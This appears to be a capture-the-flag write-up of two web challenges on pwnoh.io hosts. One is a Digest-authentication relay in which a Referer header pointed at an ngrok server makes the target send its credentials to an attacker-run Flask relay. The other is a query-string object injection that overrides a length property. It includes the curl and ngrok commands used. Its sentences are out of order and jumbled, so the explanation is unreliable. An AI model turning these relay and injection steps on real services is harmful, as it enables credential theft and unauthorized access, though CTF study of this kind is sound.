https://authman.challs.pwnoh.io
/api/check will compute the Authorization header using its stored username and password, and send it to our MITM server.
/auth will respond with a challenge, which we will relay to /api/check.

A major flaw in this protocol is that it's vulnerable to MITM relay attacks - if we had a server between the client and the real server, we could relay the server's challenge to the client, let the client compute the authentication response, and when the client sends us the Authorization header, we could relay it to the real server ourselves and get authenticated.
Call /api/check with the Referer header set to our ngrok URL: curl -H Referer: http://ngrok-url https://authman.challs.pwnoh.io/api/check
Client sends a request to the server that doesn't contain any credentials.
Client uses the nonce, username, password, HTTP method, and requested URL to create a hash (MD5 by default) and sends it back to the server in the "Authorization" header.

Looking at the provided routes.py, we can see that the authentication is done using Digest access authentication ( HTTPDigestAuth), which is an authentication method that doesn't send the password in plaintext, but uses a challenge-response mechanism:
Looking at the source code ( auth.html, routes.py), we can tell that in order to get the flag, we need to authenticate on the /auth endpoint.
Luckily for us, we can control the endpoint that the server will send the request to, because the server uses the Referer header to get the URL!

Luckily for us, we have an endpoint that can authenticate using Digest authentication on our behalf - the /api/check endpoint, which gets the first username and password from the database ((user, pw), *_ = app.config['AUTH_USERS'].items()) and sends a request to authenticate using the protocol: auth = HTTPDigestAuth(user,pw).
Our MITM server will pass the Authorization header to the /auth endpoint, which will authenticate us and return the flag.
run the server: link to code

Server performs the same hash calculation with the stored password and compares it to the hash sent by the client. If they match, the client is authenticated and will receive access to the protected resource.
Server responds with a 401 Unauthorized status code and a "WWW-Authenticate" header that contains a nonce (a random value).
Setup ngrok to expose the server to the internet: ngrok http 8080
So in order to authenticate on /auth, we can set up a server that will act as a MITM relay between our client and the real server:
The /api/check endpoint will try to authenticate with our MITM server, which will forward the request to the /auth endpoint on the server.
The flag will be printed in the response on our server.
To implement this, we can use Flask to create a simple MITM server that will relay the requests between the client and the real server, and host it on a public server (e.g., using ngrok)

Looking at the given 'index.js' we can see the flag will be revealed when this condition is true:
However, this is an extremely large number, and any normal input would not satisfy this condition.

We can see that for any input we will put through the box, we will get to the failure page, showing the username. For example, on https://big-chungus.challs.pwnoh.io/?username=hi we get: Welcome, hi...
When attempting to use the username as an array, to trick the length check (ie. https://big-chungus.challs.pwnoh.io/?username[100]=hi), we see the username is printed as Welcome, [object Object]...
This means that the username is being treated as an object, and thus we can add properties to set the length to a very large number.
To inject it through the URL, we can use: https://big-chungus.challs.pwnoh.io/?username[100]=hiusername[length]=99999999999
Now, when we visit the page, we reach that length check, and pass it because the length property is being read from the object as a very large number.
